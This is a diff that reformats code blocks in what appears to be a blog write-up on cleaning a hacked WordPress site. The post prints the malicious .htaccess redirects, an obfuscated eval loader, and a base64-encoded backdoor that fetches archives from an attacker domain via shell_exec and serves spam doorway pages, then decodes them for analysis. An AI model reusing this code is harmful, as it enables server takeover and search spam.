@@ -41,7 +41,7 @@ As I didn't have FTP/SSH access to the server yet, the very first thing I did wa
 
 After obtaining FTP access the first file I opened was the `.htaccess` file, which contains the core of Wordpress's routing logic. I finally discovered the source of evil.
 
-```{.bash .numberLines startFrom="1"}
+```bash
 RewriteEngine On
 
 RewriteCond %{ENV:REDIRECT_STATUS} 200
@@ -55,7 +55,7 @@ Specifically, the last three lines of the `.htaccess` file contain "conditional 
 
 Naturally, the next file I opened is `lusts-disadvantage.php`.
 
-```{.php .numberLines startFrom="1"}
+```php
 <?php
 $jbwdsp="\x63"."\x72".chr(101)."\x61".chr(116)."e"."_".chr(102)."\x75"."n".chr(99)."\x74"."\x69"."\x6f"."\x6e";
 $cmrxzr = $jbwdsp('$a',strrev(';)a$(lave'));
@@ -69,7 +69,7 @@ I also noticed another file named `sawsalag.php`. Very curious what that means. 
 
 Its contents are yet another set of obscured code. This time it's a bit less obvious than a giant block of base 64. Instead it's obfuscated PHP.
 
-```{.php .numberLines startFrom="1"}
+```php
 <?php
 $bliss ='s';$eradicate='F';$canvassing= '_';$booms = '>'; $longer= 'NLs';$chi=';';$filthiest= 'O';
 $cadent = 'r';$magnanimous='e';
@@ -151,27 +151,27 @@ $loudspeaker[1]);
 
 I could skip straight to the cleanup phase (Step 5), but because that's boring, lets instead see what the "secret" blob of code is doing.
 
-```{.php .numberLines startFrom="1"}
+```php
 echo "\x63"."\x72".chr(101)."\x61".chr(116)."e"."_".chr(102)."\x75"."n".chr(99)."\x74"."\x69"."\x6f"."\x6e";
 ```
 Which outputs: <a href="http://php.net/manual/en/function.create-function.php" target="blank">create_function</a>
 
-```{.php .numberLines startFrom="1"}
+```php
 $cmrxzr = $jbwdsp('$a',strrev(';)a$(lave'));
 ```
 In conjunction with the above, and the `strrev` (string reverse) functions evaluated I get:
-```{.php .numberLines startFrom="1"}
+```php
 $cmrxzr = create_function('$a', 'eval($a);');
 ```
 That is, a function that takes a string of php code and evaluates it. I will next simply reverse the blob of code below, and extract base 64 decoded text. There is no need to actually evaluate it as that's trivial. The reversed base64_decode chunk looks like this:
 
-```{.php .numberLines startFrom="1"}
+```php
 base64_decode("c2V0X3RpbWVfbGltaXQoMCk7DQoNCmZ1bmN0aW9uIGdldF9wYWdlX2J5X2N1cmwoJHVybCwkdXNlcmFnZW50PSJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjE7IFdPVzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMzQuMC4xODQ3LjEzMSBTYWZhcmkvNTM3LjM2Iil7DQoJCSRjaCA9IGN1cmxfaW5pdCAoKTsNCgkJY3VybF9zZXRvcHQgKCRjaCwgQ1VSTE9QVF9VUkwsJHVybCk7DQoJCWN1cmxfc2V0b3B0ICgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOw0KCQljdXJsX3NldG9wdCAoJGNoLCBDVVJMT1BUX1RJTUVPVVQsIDMwKTsNCgkJY3VybF9zZXRvcHQgKCRjaCwgQ1VSTE9QVF9TU0xfVkVSSUZZUEVFUiwgMCk7DQoJCWN1cmxfc2V0b3B0ICgkY2gsIENVUkxPUFRfU1NMX1ZFUklGWUhPU1QsIDApOw0KCQljdXJsX3NldG9wdCAoJGNoLCBDVVJMT1BUX1VTRVJBR0VOVCwgJHVzZXJhZ2VudCk7DQoJCSRyZXN1bHQgPSBjdXJsX2V4ZWMgKCRjaCk7DQoJCWN1cmxfY2xvc2UoJGNoKTsNCgkJcmV0dXJuICRyZXN1bHQ7DQp9DQoNCgkJJGRvb3Jjb250ZW50PSIiOw0KCQkkeD1AJF9QT1NUWyJwcHBwX2NoZWNrIl07DQoJCSRtZDVwYXNzPSJlNWU0NTcwMTgyODIwYWYwYTE4M2NlMTUyMGFmZTQzYiI7DQoNCgkJJGhvc3Q9QCRfU0VSVkVSWyJIVFRQX0hPU1QiXTsNCgkJJHVyaT1AJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl07DQoJCSRob3N0PXN0cl9yZXBsYWNlKCJ3d3cuIiwiIiwkaG9zdCk7DQoJCSRtZDVob3N0PW1kNSgkaG9zdCk7DQoJCSR1cng9JGhvc3QuJHVyaTsNCgkJJG1kNXVyeD1tZDUoJHVyeCk7DQoNCgkJaWYgKGZ1bmN0aW9uX2V4aXN0cygnc3lzX2dldF90ZW1wX2RpcicpKSB7JHRtcHBhdGggPSBzeXNfZ2V0X3RlbXBfZGlyKCk7aWYgKCFpc19kaXIoJHRtcHBhdGgpKXsJJHRtcHBhdGggPSAoZGlybmFtZShfX0ZJTEVfXykpOwl9CX0gZWxzZSB7ICR0bXBwYXRoID0gKGRpcm5hbWUoX19GSUxFX18pKTt9DQoNCgkJJGNkaXI9JHRtcHBhdGguIi8uIi4kbWQ1aG9zdC4iLyI7DQoJCSRkb21haW49YmFzZTY0X2RlY29kZSgiWmk1dFpXNTVkV1J1ZVdFdVkyOXQiKTsNCg0KCQlpZiAoJHghPSIiKXsNCgkJCSRwPW1kNShiYXNlNjRfZGVjb2RlKEAkX1BPU1RbInAiXSkpOw0KCQkJaWYgKCRwIT0kbWQ1cGFzcylyZXR1cm47DQoJCQkkcGE9QCRfUE9TVFsicGEiXTsNCg0KCQkJaWYgKCgkeD09IjIiKXx8KCR4PT0iNCIpKXsNCgkJCQllY2hvICIjIyNVUERBVElOR19GSUxFUyMjI1xuIjsNCgkJCQlpZiAoJHg9PSIyIil7DQoJCQkJCSRjbWQ9ImNkICR0bXBwYXRoOyBybSAtcmYgLiRtZDVob3N0IjsNCgkJCQkJZWNobyBzaGVsbF9leGVjKCRjbWQpOw0KCQkJCX0NCgkJCQkkY21kPSJjZCAkdG1wcGF0aDsgd2dldCBodHRwOi8vdXBkYXRlLiRkb21haW4vYXJjLyRtZDVob3N0LnRneiAtTyAxLnRnejsgdGFyIC14emYgMS50Z3o7IHJtIC1yZiAxLnRneiI7DQoJCQkJaWYgKCRwYSE9IiIpew0KCQkJCQkkcGErPTA7DQoJCQkJCSRjbWQ9ImNkICR0bXBwYXRoOyB3Z2V0IGh0dHA6Ly91cGRhdGUuJGRvbWFpbi9hcmMvIi4kbWQ1aG9zdC4iXyIuJHBhLiIudGd6IC1PIDEudGd6OyB0YXIgLXh6ZiAxLnRnejsgcm0gLXJmIDEudGd6IjsNCgkJCQl9DQoJCQkJZWNobyBzaGVsbF9leGVjKCRjbWQpOw0KCQkJCWV4aXQ7DQoJCQl9DQoJCQlpZiAoJHg9PSIzIil7DQoJCQkJZWNobyAiIyMjV09SS0VEIyMjXG4iO2V4aXQ7DQoJCQl9DQoJCX1lbHNlew0KCQkJJGN1cng9JGNkaXIuJG1kNXVyeDsNCgkJCWlmIChAZmlsZV9leGlzdHMoJGN1cngpKXsNCgkJCQlAbGlzdCgkSURwYWNrLCRtaywkZG9vcmNvbnRlbnQsJHBkZiwkY29udGVudHR5cGUpPUBleHBsb2RlKCJ8fHwiLEBmaWxlX2dldF9jb250ZW50cygkY3VyeCkpOw0KCQkJCSRkb29yY29udGVudD1AYmFzZTY0X2RlY29kZSgkZG9vcmNvbnRlbnQpOw0KCQkJCQ0KCQkJCSRib3Q9MDsNCgkJCQkkc2U9MDsNCgkJCQkkbW9iaWxlPTA7DQoJCQkJaWYgKHByZWdfbWF0Y2goIiNnb29nbGV8Z3NhLWNyYXdsZXJ8QWRzQm90LUdvb2dsZXxNZWRpYXBhcnRuZXJzfEdvb2dsZWJvdC1Nb2JpbGV8c3BpZGVyfGJvdHx5YWhvb3xnb29nbGUgd2ViIHByZXZpZXd8bWFpbFwucnV8Y3Jhd2xlcnxiYWlkdXNwaWRlciNpIiwgQCRfU0VSVkVSWyJIVFRQX1VTRVJfQUdFTlQiIF0pKSRib3Q9MTsNCgkJCQlpZiAocHJlZ19tYXRjaCgiI2FuZHJvaWR8c3ltYmlhbnxpcGhvbmV8aXBhZHxzZXJpZXM2MHxtb2JpbGV8cGhvbmV8d2FwfG1pZHB8bW9iaXxtaW5pI2kiLCBAJF9TRVJWRVJbIkhUVFBfVVNFUl9BR0VOVCIgXSkpJG1vYmlsZT0xOw0KCQkJCWlmIChwcmVnX21hdGNoKCIjZ29vZ2xlfGJpbmdcLmNvbXxtc25cLmNvbXxhc2tcLmNvbXxhb2xcLmNvbXxhbHRhdmlzdGF8c2VhcmNofHlhaG9vfGNvbmR1aXRcLmNvbXxjaGFydGVyXC5uZXR8d293XC5jb218bXl3ZWJzZWFyY2hcLmNvbXxoYW5keWNhZmVcLmNvbXxiYWJ5bG9uXC5jb20jaSIsIEAkX1NFUlZFUlsiSFRUUF9SRUZFUkVSIiBdKSkkc2U9MTsNCgkJCQlpZiAoJGJvdCkgew0KCQkJCQkkcGRmKz0wOw0KCQkJCQlpZiAoJHBkZj09MSl7DQoJCQkJCQloZWFkZXIoIkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vcGRmIik7DQoJCQkJCX0NCgkJCQkJaWYgKCRwZGY9PTIpew0KCQkJCQkJaGVhZGVyKCJDb250ZW50LVR5cGU6IGltYWdlL3BuZyIpOw0KCQkJCQl9DQoJCQkJCWlmICgkcGRmPT0zKXsNCgkJCQkJCWhlYWRlcigiQ29udGVudC1UeXBlOiB0ZXh0L3htbCIpOw0KCQkJCQl9DQoJCQkJCWlmICgkcGRmPT00KXsNCgkJCQkJCSRjb250ZW50dHlwZT1AYmFzZTY0X2RlY29kZSgkY29udGVudHR5cGUpOw0KCQkJCQkJJHR5cGVzPWV4cGxvZGUoIlxuIiwkY29udGVudHR5cGUpOw0KCQkJCQkJZm9yZWFjaCgkdHlwZXMgYXMgJHZhbCl7DQoJCQkJCQkJJHZhbD10cmltKCR2YWwpOw0KCQkJCQkJCWlmKCR2YWwhPSIiKWhlYWRlcigkdmFsKTsNCgkJCQkJCX0NCgkJCQkJfQ0KCQkJCQllY2hvICRkb29yY29udGVudDtleGl0Ow0KCQkJCX0NCgkJCQlpZiAoJHNlKSB7ZWNobyBnZXRfcGFnZV9ieV9jdXJsKCJodHRwOi8vJGRvbWFpbi9scC5waHA/aXA9Ii4kSURwYWNrLiImbWs9Ii5yYXd1cmxlbmNvZGUoJG1rKS4iJmQ9Ii4kbWQ1aG9zdC4iJnU9Ii4kbWQ1dXJ4LiImYWRkcj0iLiRfU0VSVkVSWyJSRU1PVEVfQUREUiJdLEAkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl0pO2V4aXQ7fQ0KDQoJCQkJaGVhZGVyKCRfU0VSVkVSWydTRVJWRVJfUFJPVE9DT0wnXSAuICIgNDA0IE5vdCBGb3VuZCIpOw0KCQkJCWVjaG8gJzwhRE9DVFlQRSBIVE1MIFBVQkxJQyAiLS8vSUVURi8vRFREIEhUTUwgMi4wLy9FTiI+JyAuICJcbiI7DQoJCQkJZWNobyAnPGh0bWw+PGhlYWQ+JyAuICJcbiI7DQoJCQkJZWNobyAnPHRpdGxlPjQwNCBOb3QgRm91bmQ8L3RpdGxlPicgLiAiXG4iOw0KCQkJCWVjaG8gJzwvaGVhZD48Ym9keT4nIC4gIlxuIjsNCgkJCQllY2hvICc8aDE+Tm90IEZvdW5kPC9oMT4nIC4gIlxuIjsNCgkJCQllY2hvICc8cD5UaGUgcmVxdWVzdGVkIFVSTCAnIC4gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10gLiAnIHdhcyBub3QgZm91bmQgb24gdGhpcyBzZXJ2ZXIuPC9wPicgLiAiXG4iOw0KCQkJCWVjaG8gJzxocj4nIC4gIlxuIjsNCgkJCQllY2hvICc8YWRkcmVzcz4nIC4gJF9TRVJWRVJbJ1NFUlZFUl9TT0ZUV0FSRSddIC4gJyBQSFAvJyAuIHBocHZlcnNpb24oKSAuICcgU2VydmVyIGF0ICcgLiAkX1NFUlZFUlsnSFRUUF9IT1NUJ10gLiAnIFBvcnQgODA8L2FkZHJlc3M+JyAuICJcbiI7DQoJCQkJZWNobyAnPC9ib2R5PjwvaHRtbD4nOw0KCQkJCWV4aXQ7DQoJCQl9ZWxzZXsNCg0KDQoJCQkJJGNydXJsPSJodHRwOi8vIi5AJF9TRVJWRVJbJ0hUVFBfSE9TVCddLkAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXTsNCgkJCQkkYnVmPWdldF9wYWdlX2J5X2N1cmwoJGNydXJsKTsNCg0KCQkJCSRjdXJ4PSRjZGlyLiJmZmYuc2VzcyI7DQoJCQkJaWYgKEBmaWxlX2V4aXN0cygkY3VyeCkpew0KCQkJCQkkbGlua3M9QGZpbGUoJGN1cngsRklMRV9TS0lQX0VNUFRZX0xJTkVTfEZJTEVfSUdOT1JFX05FV19MSU5FUyk7DQoJCQkJCSRjPUBjb3VudCgkbGlua3MpLTE7DQoJCQkJCXNodWZmbGUoJGxpbmtzKTsNCgkJCQkJaWYgKCRjPjIwKSRjPTIwOw0KCQkJCQkkcmVnZXhwID0gIjxhXHNbXj5dKmhyZWY9KFwiPz8pKFteXCIgPl0qPylcXDFbXj5dKj4oLiopPFwvYT4iOw0KCQkJCQlpZihwcmVnX21hdGNoX2FsbCgiLyRyZWdleHAvc2lVIiwgJGJ1ZiwgJG1hdGNoZXMpKSB7DQoJCQkJCQkkenZhbD0kbWF0Y2hlc1swXTsNCgkJCQkJCXNodWZmbGUoJHp2YWwpOw0KCQkJCQkJZm9yZWFjaCgkenZhbCBhcyAkdmFsKXsNCgkJCQkJCQlpZiAoJGM8MClicmVhazsNCgkJCQkJCQlsaXN0KCRsLCRhbmNob3IpPWV4cGxvZGUoInx8fCIsdHJpbSgkbGlua3NbJGNdKSk7DQoJCQkJCQkJJG5ldz0nPGEgaHJlZj0iJy4kbC4nIj4nLiRhbmNob3IuJzwvYT4nOw0KCQkJCQkJCSRidWY9c3RyX2lyZXBsYWNlKCR2YWwsJG5ldywkYnVmKTsNCgkJCQkJCQkkYy0tOw0KCQkJCQkJfQ0KCQkJCQl9CQkJCQkNCgkJCQkJDQoJCQkJfQ0KCQkJCWVjaG8gJGJ1ZjsNCg0KCQkJfQ0KCQl9DQo=");
 ```
 
 Next, I echo out the above statement and that should yield us the content of the attacker's script. I also formatted it since hackers don't seem to like to do it themselves.
 
-```{.php .numberLines startFrom="1"}
+```php
 set_time_limit(0);
 
 function get_page_by_curl($url, $useragent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36") {
@@ -317,25 +317,25 @@ if ($x != "") {
 
 Good thing I opened this up! This script has some meat to it. First, lets go through and do some fact discovering. I'll start with some simple base 64 decodings and other facts that jump out at me.
 
-```{.php .numberLines startFrom="1"}
+```php
 $domain = base64_decode("Zi5tZW55dWRueWEuY29t");
 // ouptut: f.menyudnya.com
 ```
 Security through obfuscation? I wonder what the actual effectiveness of base64_encoding this is. I guess it's enough to detour most people.
 
 I'll continue to decode the url that content is downloaded and installed to the our server from.
-```{.php .numberLines startFrom="1"}
+```php
 'http://update.' . base64_decode("Zi5tZW55dWRueWEuY29t") . '/arc/' . $md5host;
 // ouptut: http://update.f.menyudnya.com/arc/<md5_of_host>.tgz
 ```
 Despite verifying the url was generated correctly, every attempt to access it yielded a 404. :(
 
-```{.php .numberLines startFrom="1"}
+```php
 $md5pass = "e5e4570182820af0a183ce1520afe43b";
 ```
 Just making a mental note of this. Testing against various rainbow tables didn't yield anything. Another thing that caught my eye is that this script accepts a `POST` request containing what seems to be a base 64 encoded password `@$_POST["p"]` as well as mode `@$_POST["pppp_check"]`. Perfect, lets set some traps to capture the attacker's input. It will very likely be useless, but it could still be fun to catch the attacker's password. :)
 
-```{.php .numberLines startFrom="1"}
+```php
 $info = array();
 $info['request'] = $_REQUEST;
 $info['server'] = $_SERVER;
@@ -361,7 +361,7 @@ A quick analysis shows a chain of variable settings, commas, and parenthesis. Th
 
 The deciphered code looks something like the below code. Here is a [Gist](https://gist.github.com/kennycason/3520b6bc4de6aad5fc4e3fe1b7287a7a) that shows how I deciphered the script.
 
-```{.php .numberLines startFrom="1"}
+```php
 create_function( ,eval(array_pop(func_get_args()));)
 response to function: lambda_1(
 $i=array_merge($_REQUEST,$_COOKIE,$_SERVER);
@@ -399,7 +399,7 @@ At this point we still don't know how the attacker got in but the scripts seem p
 3. Take the website offline for now. We are going to go through and remove files.
 
     - First, remove the conditional redirects from the `.htaccess` file. Specifically, remove the following lines.
-    ```{.bash .numberLines startFrom="1"}
+    ```bash
     RewriteCond %{HTTP_USER_AGENT} (google|yahoo|msn|aol|bing) [OR]
     RewriteCond %{HTTP_REFERER} (google|yahoo|msn|aol|bing)
     RewriteRule ^(.*)$ lusts-disadvantage.php?$1 [L]
